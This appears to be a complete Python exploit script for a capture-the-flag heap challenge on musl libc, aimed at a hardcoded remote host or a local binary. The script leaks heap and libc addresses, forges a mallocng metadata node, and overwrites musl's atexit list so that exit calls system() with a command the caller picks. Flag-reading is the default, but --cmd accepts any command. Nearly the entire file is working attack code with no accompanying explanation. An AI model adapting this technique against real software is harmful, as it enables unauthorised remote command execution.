#!/usr/bin/env python3
import argparse
import socket
import struct
import subprocess
import sys
from pathlib import Path


HOST = "34.141.18.238"
PORT = 30569

LEAK_META_OFF = 0xF0
LEAK_HDR2_OFF = 0xF8
LIBC_PTR_OFF = 0x28

LIBC_LEAK_TO_BASE = 0xA6CD0

LIBC_BUILTIN_OFF = 0xA36A0
LIBC_HEAD_OFF = 0xA5DC8
LIBC_SLOT_QWORD_OFF = 0xA5FE0
LIBC_SYSTEM_OFF = 0x48368


def u64(data: bytes) -> int:
    return struct.unpack("<Q", data)[0]


class Tube:
    def __init__(self, process=None, sock=None):
        self.process = process
        self.sock = sock
        self._buffer = bytearray()

    def _read_some(self) -> bytes:
        if self.sock is not None:
            data = self.sock.recv(4096)
        else:
            data = self.process.stdout.read(1)
        if not data:
            raise EOFError(bytes(self._buffer))
        return data

    def recv_until(self, needle: bytes) -> bytes:
        while not self._buffer.endswith(needle):
            self._buffer.extend(self._read_some())
        data = bytes(self._buffer)
        self._buffer.clear()
        return data

    def recv_exact(self, size: int) -> bytes:
        while len(self._buffer) < size:
            self._buffer.extend(self._read_some())
        data = bytes(self._buffer[:size])
        del self._buffer[:size]
        return data

    def send(self, data: bytes) -> None:
        if self.sock is not None:
            self.sock.sendall(data)
        else:
            self.process.stdin.write(data)
            self.process.stdin.flush()

    def sendline(self, data) -> None:
        if isinstance(data, int):
            data = str(data).encode()
        elif isinstance(data, str):
            data = data.encode()
        self.send(data + b"\n")

    def recv_all(self) -> bytes:
        chunks = [bytes(self._buffer)]
        self._buffer.clear()
        if self.sock is not None:
            while True:
                data = self.sock.recv(4096)
                if not data:
                    break
                chunks.append(data)
        else:
            chunks.append(self.process.stdout.read())
            chunks.append(self.process.stderr.read())
        return b"".join(chunks)

    def close(self) -> None:
        if self.sock is not None:
            self.sock.close()
        if self.process is not None:
            self.process.kill()


def start_local(dist: Path) -> Tube:
    process = subprocess.Popen(
        [str(dist / "libc.so"), str(dist / "chall")],
        cwd=str(dist),
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    return Tube(process=process)


def start_remote(host: str, port: int) -> Tube:
    sock = socket.create_connection((host, port))
    return Tube(sock=sock)


def menu(tube: Tube, choice: int) -> None:
    tube.recv_until(b"> ")
    tube.sendline(choice)


def alloc(tube: Tube, idx: int, size: int) -> None:
    menu(tube, 1)
    tube.recv_until(b"index: ")
    tube.sendline(idx)
    tube.recv_until(b"Enter size: ")
    tube.sendline(size)


def free(tube: Tube, idx: int) -> None:
    menu(tube, 2)
    tube.recv_until(b"index: ")
    tube.sendline(idx)


def write_note(tube: Tube, idx: int, data: bytes) -> None:
    menu(tube, 3)
    tube.recv_until(b"index: ")
    tube.sendline(idx)
    tube.recv_until(b"size: ")
    tube.sendline(len(data))
    tube.recv_until(b"data: ")
    tube.send(data)


def read_note(tube: Tube, idx: int, size: int) -> bytes:
    menu(tube, 4)
    tube.recv_until(b"index: ")
    tube.sendline(idx)
    tube.recv_until(b"size: ")
    tube.sendline(size)
    return tube.recv_exact(size)


def magic(tube: Tube, addr: int, value: int) -> None:
    menu(tube, 5)
    tube.recv_until(b"address: ")
    tube.sendline(hex(addr))
    tube.recv_until(b"value: ")
    tube.sendline(str(value))


def run_exploit(tube: Tube, command: str) -> bytes:
    cmd = command.encode() + b"\x00"
    if len(cmd) > 0xA0:
        raise ValueError("command too long")

    alloc(tube, 0, 0xA0)
    write_note(tube, 0, b"A" * 0xA0)
    alloc(tube, 1, 0xA0)
    write_note(tube, 1, cmd)
    alloc(tube, 2, 0xA0)
    write_note(tube, 2, b"C" * 0xA0)

    leak = read_note(tube, 2, 0x100)
    meta = u64(leak[LEAK_META_OFF:LEAK_META_OFF + 8])
    hdr2 = u64(leak[LEAK_HDR2_OFF:LEAK_HDR2_OFF + 8])

    free(tube, 0)

    # Splice a fake mallocng metadata node right before the real one.
    fake = meta - 0x20
    magic(tube, fake, meta)
    magic(tube, fake + 8, hdr2)
    magic(tube, meta + 0x10, fake)

    alloc(tube, 3, 0xA0)
    leak2 = read_note(tube, 3, 0x100)

    group_ptr = u64(leak2[LIBC_PTR_OFF:LIBC_PTR_OFF + 8])
    libc_base = group_ptr - LIBC_LEAK_TO_BASE
    cmd_ptr = group_ptr + 0x10

    builtin = libc_base + LIBC_BUILTIN_OFF
    head = libc_base + LIBC_HEAD_OFF
    slot_qword = libc_base + LIBC_SLOT_QWORD_OFF
    system = libc_base + LIBC_SYSTEM_OFF

    # Forge a single musl atexit entry: system(command).
    magic(tube, builtin, 0)
    magic(tube, builtin + 8, system)
    magic(tube, builtin + 0x108, cmd_ptr)
    magic(tube, head, builtin)

    # slot is the upper 4 bytes of the qword at LIBC_SLOT_QWORD_OFF.
    magic(tube, slot_qword, 1 << 32)

    # Hidden real exit option.
    menu(tube, 6)
    return tube.recv_all()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--local", action="store_true")
    parser.add_argument("--dist", type=Path)
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument("--cmd", default="cat flag.txt")
    args = parser.parse_args()

    if args.local:
        if args.dist is None:
            raise SystemExit("--local requires --dist")
        tube = start_local(args.dist)
    else:
        tube = start_remote(args.host, args.port)

    try:
        output = run_exploit(tube, args.cmd)
    finally:
        tube.close()

    sys.stdout.buffer.write(output)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
